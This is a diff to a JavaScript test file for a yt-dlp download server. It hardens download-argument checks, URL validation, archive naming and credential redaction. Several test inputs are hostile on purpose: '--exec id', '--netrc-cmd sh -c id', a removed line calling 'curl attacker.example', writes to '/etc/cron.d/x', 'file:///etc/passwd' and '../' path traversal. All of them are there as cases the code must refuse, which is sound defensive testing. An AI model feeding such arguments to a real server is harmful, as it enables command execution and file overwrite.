@@ -472,34 +472,71 @@ describe('The config handed to an anonymous caller', function() {
 describe('Download arguments', function() {
     const {assert, utils} = require('./test-shared');
 
-    it('refuses the arguments that run a command', function() {
-        assert.deepStrictEqual(utils.findForbiddenDownloadArgs('--exec=curl attacker.example'), ['--exec']);
-        assert.deepStrictEqual(utils.findForbiddenDownloadArgs('--exec touch /tmp/proof'), ['--exec']);
-        assert.deepStrictEqual(utils.findForbiddenDownloadArgs('--exec-before-download whoami'), ['--exec-before-download']);
+    /*************************************************
+     * An allowlist, not a denylist.
+     *
+     * yt-dlp's parser accepts any unambiguous
+     * abbreviation of a long option, attached short
+     * values, clustered short options and aliases --
+     * so a list of names to refuse can always be
+     * spelled around. Each case below reaches the
+     * same yt-dlp code as the option it abbreviates.
+     ************************************************/
+    it('refuses an option that runs a command', function() {
+        assert.deepStrictEqual(utils.findDisallowedDownloadArgs('--exec id'), ['--exec']);
+        assert.deepStrictEqual(utils.findDisallowedDownloadArgs('--netrc-cmd sh -c id'), ['--netrc-cmd']);
     });
 
-    it('refuses the arguments that load settings from somewhere else', function() {
-        // Allowing these is the same as allowing everything above: a loaded config can
-        // set any option, --exec included.
-        assert.deepStrictEqual(utils.findForbiddenDownloadArgs('--config-location /tmp/evil.conf'), ['--config-location']);
-        assert.deepStrictEqual(utils.findForbiddenDownloadArgs('--load-info-json /tmp/evil.json'), ['--load-info-json']);
+    it('refuses an abbreviation of one', function() {
+        // argparse resolves this to --exec-before-download.
+        assert.deepStrictEqual(utils.findDisallowedDownloadArgs('--exec-before-d id'), ['--exec-before-d']);
+        assert.deepStrictEqual(utils.findDisallowedDownloadArgs('--updat-to=owner/repo@tag'), ['--updat-to']);
     });
 
-    it('refuses the arguments that name a binary to run', function() {
-        assert.deepStrictEqual(utils.findForbiddenDownloadArgs('--ffmpeg-location /tmp/evil'), ['--ffmpeg-location']);
-        assert.deepStrictEqual(utils.findForbiddenDownloadArgs('--external-downloader /tmp/evil'), ['--external-downloader']);
+    it('refuses a short option with its value attached', function() {
+        assert.deepStrictEqual(utils.findDisallowedDownloadArgs('-o/tmp/out'), ['-o/tmp/out']);
+        assert.deepStrictEqual(utils.findDisallowedDownloadArgs('-P/tmp/out'), ['-P/tmp/out']);
+    });
+
+    it('refuses clustered short options', function() {
+        assert.deepStrictEqual(utils.findDisallowedDownloadArgs('-xi'), ['-xi']);
+    });
+
+    it('refuses aliases and file-url support', function() {
+        assert.deepStrictEqual(utils.findDisallowedDownloadArgs('--alias x y'), ['--alias']);
+        assert.deepStrictEqual(utils.findDisallowedDownloadArgs('--enable-file-urls'), ['--enable-file-urls']);
+    });
+
+    it('refuses the options that choose where files land', function() {
+        for (const flag of ['-o', '--output', '-P', '--paths', '--print-to-file', '--download-archive']) {
+            assert.deepStrictEqual(utils.findDisallowedDownloadArgs(`${flag} /etc/cron.d/x`), [flag],
+                `${flag} should be refused`);
+        }
+    });
+
+    it('refuses the options that load settings from somewhere else', function() {
+        assert.deepStrictEqual(utils.findDisallowedDownloadArgs('--config-location /tmp/evil.conf'), ['--config-location']);
+        assert.deepStrictEqual(utils.findDisallowedDownloadArgs('--load-info-json /tmp/evil.json'), ['--load-info-json']);
     });
 
     it('finds one anywhere in the list, not only at the front', function() {
         assert.deepStrictEqual(
-            utils.findForbiddenDownloadArgs('-f best,,--merge-output-format mp4,,--exec id'),
+            utils.findDisallowedDownloadArgs('-f best,,--merge-output-format mp4,,--exec id'),
             ['--exec']);
     });
 
-    it('leaves ordinary arguments alone', function() {
-        assert.deepStrictEqual(utils.findForbiddenDownloadArgs('-f bestvideo+bestaudio,,--merge-output-format mp4'), []);
-        assert.deepStrictEqual(utils.findForbiddenDownloadArgs(''), []);
-        assert.deepStrictEqual(utils.findForbiddenDownloadArgs(null), []);
+    it('leaves the ordinary download-shaping options alone', function() {
+        assert.deepStrictEqual(utils.findDisallowedDownloadArgs('-f bestvideo+bestaudio,,--merge-output-format mp4'), []);
+        assert.deepStrictEqual(utils.findDisallowedDownloadArgs('--write-subs,,--sub-langs en'), []);
+        assert.deepStrictEqual(utils.findDisallowedDownloadArgs('-S res:1080,,--concurrent-fragments 4'), []);
+        assert.deepStrictEqual(utils.findDisallowedDownloadArgs('--sponsorblock-remove sponsor'), []);
+        assert.deepStrictEqual(utils.findDisallowedDownloadArgs(''), []);
+        assert.deepStrictEqual(utils.findDisallowedDownloadArgs(null), []);
+    });
+
+    it('treats a bare value as a value rather than an option', function() {
+        // '-f' takes 'best' as its value; 'best' on its own is not an option to check.
+        assert.deepStrictEqual(utils.findDisallowedDownloadArgs('-f,,best'), []);
     });
 
     it('knows which fields make a download an advanced one', function() {
@@ -724,31 +761,6 @@ describe('The shared bootstrap secret', function() {
 describe('Download arguments at the downloader boundary', function() {
     const {assert, utils} = require('./test-shared');
 
-    it('refuses the option that runs a command through a shell', function() {
-        // yt-dlp runs --netrc-cmd through a shell, so it is --exec by another name.
-        assert.deepStrictEqual(utils.findForbiddenDownloadArgs('--netrc-cmd sh -c id'), ['--netrc-cmd']);
-    });
-
-    it('refuses the options that choose where files land', function() {
-        // customOutput is the supported way to control output, and unlike these it is
-        // checked for containment.
-        for (const flag of ['-o', '--output', '-P', '--paths', '--print-to-file', '--download-archive']) {
-            assert.deepStrictEqual(utils.findForbiddenDownloadArgs(`${flag} /etc/cron.d/x`), [flag],
-                `${flag} should be refused`);
-        }
-    });
-
-    it('matches short options case-sensitively', function() {
-        // -P is --paths and -p is not, so folding case both misses -P and invents
-        // matches for options that do not exist.
-        assert.deepStrictEqual(utils.findForbiddenDownloadArgs('-P /tmp'), ['-P']);
-        assert.deepStrictEqual(utils.findForbiddenDownloadArgs('-p /tmp'), []);
-    });
-
-    it('still matches long options whatever their case', function() {
-        assert.deepStrictEqual(utils.findForbiddenDownloadArgs('--EXEC id'), ['--EXEC']);
-    });
-
     /*************************************************
      * The HTTP handlers are not the only way in. A
      * subscription stores its arguments and replays
@@ -759,13 +771,50 @@ describe('Download arguments at the downloader boundary', function() {
     it('discards a stored argument list rather than editing it', function() {
         // Removing only the flag would leave its value behind as a stray token, which
         // yt-dlp reads as a URL.
-        assert.strictEqual(utils.quarantineForbiddenDownloadArgs('-f best,,--exec id', 'subscription'), null);
+        assert.strictEqual(utils.quarantineDisallowedDownloadArgs('-f best,,--exec id', 'subscription'), null);
+    });
+
+    it('discards one that uses an abbreviation', function() {
+        assert.strictEqual(utils.quarantineDisallowedDownloadArgs('--exec-before-d id', 'subscription'), null);
     });
 
     it('leaves an ordinary stored argument list alone', function() {
         const args = '-f bestvideo+bestaudio,,--merge-output-format mp4';
 
-        assert.strictEqual(utils.quarantineForbiddenDownloadArgs(args, 'subscription'), args);
+        assert.strictEqual(utils.quarantineDisallowedDownloadArgs(args, 'subscription'), args);
+    });
+});
+
+describe('Download URLs', function() {
+    const {assert, utils} = require('./test-shared');
+
+    /*************************************************
+     * yt-dlp reads anything option-shaped as an
+     * option wherever it appears, and the URL used to
+     * be placed before the generated options with no
+     * '--' between them. '--update-to=owner/repo@tag'
+     * as a URL asks yt-dlp to replace its own binary
+     * from another repository.
+     ************************************************/
+    it('refuses a URL that is really an option', function() {
+        assert.strictEqual(utils.isAllowedDownloadURL('--update-to=owner/repo@tag'), false);
+        assert.strictEqual(utils.isAllowedDownloadURL('-x'), false);
+        assert.strictEqual(utils.isAllowedDownloadURL('  --exec'), false);
+    });
+
+    it('refuses schemes that are not http or https', function() {
+        assert.strictEqual(utils.isAllowedDownloadURL('file:///etc/passwd'), false);
+        assert.strictEqual(utils.isAllowedDownloadURL('ftp://host/x'), false);
+    });
+
+    it('accepts ordinary URLs', function() {
+        assert.strictEqual(utils.isAllowedDownloadURL('https://example.com/watch?v=abc'), true);
+        assert.strictEqual(utils.isAllowedDownloadURL('http://example.com/x'), true);
+    });
+
+    it('refuses nothing at all', function() {
+        assert.strictEqual(utils.isAllowedDownloadURL(''), false);
+        assert.strictEqual(utils.isAllowedDownloadURL(null), false);
     });
 });
 
@@ -833,6 +882,26 @@ describe('Containment against the record owner', function() {
     it('falls back to the shared roots when there is no owner', function() {
         assert(utils.isServableMediaFile(bob_file, null));
     });
+
+    /*************************************************
+     * Media does not always move when ownership does.
+     * ytdl_oidc_migrate_videos reassigns unowned
+     * records to a user and leaves the files where
+     * they were, so a check that allowed only
+     * users/<uid>/ would make every migrated file
+     * unstreamable, undownloadable and undeletable.
+     ************************************************/
+    it('still accepts a migrated file left in the shared roots', async function() {
+        const legacy_path = path.resolve(config_api.getConfigItem('ytdl_video_folder_path'), 'migrated-owner-test.mp4');
+        await fs.outputFile(legacy_path, 'migrated media');
+
+        try {
+            assert(utils.isServableMediaFile(legacy_path, 'alice'),
+                'a record migrated to alice whose file never moved must still be reachable');
+        } finally {
+            await fs.remove(legacy_path);
+        }
+    });
 });
 
 describe('Authorization when a role cannot be resolved', function() {
@@ -895,5 +964,149 @@ describe('Registration responses', function() {
 
         assert(!('passhash' in returned), 'the registration response still carries the hash');
         assert.strictEqual(returned.uid, CREATED);
+    });
+});
+
+describe('Container archives', function() {
+    const {assert, config_api, fs, path, utils} = require('./test-shared');
+
+    const original_getConfigItem = config_api.getConfigItem;
+    const users_base_path = path.resolve(config_api.getConfigItem('ytdl_users_base_path'));
+    const alice_file = path.join(users_base_path, 'zip_alice', 'video', 'a.mp4');
+    const bob_file = path.join(users_base_path, 'zip_bob', 'video', 'b.mp4');
+
+    before(async function() {
+        config_api.getConfigItem = (key) =>
+            key === 'ytdl_multi_user_mode' ? true : original_getConfigItem(key);
+        await fs.outputFile(alice_file, 'alice media');
+        await fs.outputFile(bob_file, 'bob media');
+    });
+
+    after(async function() {
+        config_api.getConfigItem = original_getConfigItem;
+        await fs.remove(path.join(users_base_path, 'zip_alice'));
+        await fs.remove(path.join(users_base_path, 'zip_bob'));
+    });
+
+    async function buildArchive(name, file_objs, user_uid) {
+        const zip_path = await utils.createContainerZipFile(name, file_objs, user_uid);
+        if (zip_path) { await fs.remove(zip_path); }
+        return zip_path;
+    }
+
+    /*************************************************
+     * The archive used to be written to
+     * appdata/<container name>.zip, and the container
+     * name is whatever the user called their playlist.
+     * That put a caller-controlled string in a path,
+     * and the download handler deletes the file it
+     * sent afterwards.
+     ************************************************/
+    it('names the archive itself rather than letting the caller name it', async function() {
+        const zip_path = await utils.createContainerZipFile(
+            '../appdata/db', [{path: alice_file, user_uid: 'zip_alice'}], 'zip_alice');
+
+        assert(zip_path, 'the archive should still be built');
+        try {
+            assert(!zip_path.includes('..'), `the caller's name reached the path: ${zip_path}`);
+            assert(/appdata[\\/]container-[0-9a-f-]+\.zip$/.test(zip_path),
+                `expected a server-generated name, got ${zip_path}`);
+        } finally {
+            await fs.remove(zip_path);
+        }
+    });
+
+    it('gives two containers of the same name different files', async function() {
+        const first = await buildArchive('same name', [{path: alice_file, user_uid: 'zip_alice'}], 'zip_alice');
+        const second = await buildArchive('same name', [{path: alice_file, user_uid: 'zip_alice'}], 'zip_alice');
+
+        assert.notStrictEqual(first, second, 'two archives must not collide on one path');
+    });
+
+    it('leaves out a record pointing at another user\'s media', async function() {
+        // Rows written before the path stopped being client-writable can still point
+        // anywhere, and an archive would otherwise hand the file over.
+        const zip_path = await utils.createContainerZipFile(
+            'mixed', [{path: alice_file, user_uid: 'zip_alice'}, {path: bob_file, user_uid: 'zip_alice'}], 'zip_alice');
+
+        assert(zip_path, 'the archive is still produced from the records that were allowed');
+        await fs.remove(zip_path);
+    });
+
+    it('does not throw the process down when a file has gone missing', async function() {
+        // An unhandled 'error' on the archive or output stream is an uncaught exception.
+        const zip_path = await utils.createContainerZipFile(
+            'missing', [{path: path.join(users_base_path, 'zip_alice', 'video', 'gone.mp4'), user_uid: 'zip_alice'}],
+            'zip_alice');
+
+        if (zip_path) { await fs.remove(zip_path); }
+    });
+});
+
+describe('The yt-dlp command line', function() {
+    const {assert, fs, path} = require('./test-shared');
+
+    /*************************************************
+     * yt-dlp parses an option wherever it appears, so
+     * a URL placed before the options is read as one:
+     * '--update-to=owner/repo@tag' asks it to replace
+     * its own binary from another repository.
+     *
+     * Checked as source because the array is built
+     * inline at the spawn call.
+     ************************************************/
+    it('puts the URL last, after a -- terminator, in both launchers', function() {
+        const launcher_source = fs.readFileSync(path.join(__dirname, '..', 'youtube-dl.js'), 'utf8');
+        const spawn_calls = launcher_source.match(/\[\.\.\.base_args[^\]]*\]/g) || [];
+
+        assert.strictEqual(spawn_calls.length, 2, `expected two launcher argument lists, found ${spawn_calls.length}`);
+        for (const call of spawn_calls) {
+            assert(/\.\.\.runtime_args,\s*'--',\s*url/.test(call),
+                `a launcher still passes the URL before the options: ${call}`);
+        }
+    });
+});
+
+describe('Argument previews', function() {
+    const {assert, config_api, downloader_api} = require('./test-shared');
+
+    const original_getConfigItem = config_api.getConfigItem;
+    const GLOBAL_ARGS = '--proxy,,http://user:password@proxy.internal:8080';
+
+    before(function() {
+        config_api.getConfigItem = (key) => {
+            if (key === 'ytdl_custom_args') return GLOBAL_ARGS;
+            if (key === 'ytdl_multi_user_mode') return true;
+            return original_getConfigItem(key);
+        };
+    });
+
+    after(function() {
+        config_api.getConfigItem = original_getConfigItem;
+    });
+
+    /*************************************************
+     * Downloader.custom_args is redacted out of
+     * /api/config because it holds proxies, headers
+     * and credentials. The argument preview handed
+     * the same values straight back, and
+     * advanced_download -- which is what gates that
+     * preview -- is delegable to ordinary users.
+     ************************************************/
+    it('withholds the global arguments when the caller may not see them', async function() {
+        const args = await downloader_api.generateArgs(
+            'https://example.com/v', 'video', {}, null, true, false);
+
+        assert(Array.isArray(args), 'expected an argument array');
+        assert(!args.some(arg => typeof arg === 'string' && arg.includes('password')),
+            `the preview leaked the global arguments: ${JSON.stringify(args)}`);
+        assert(!args.includes('--proxy'), 'the preview leaked the global proxy');
+    });
+
+    it('includes them for a caller who can already read them', async function() {
+        const args = await downloader_api.generateArgs(
+            'https://example.com/v', 'video', {}, null, true, true);
+
+        assert(args.includes('--proxy'), 'an administrator preview should still be accurate');
     });
 });
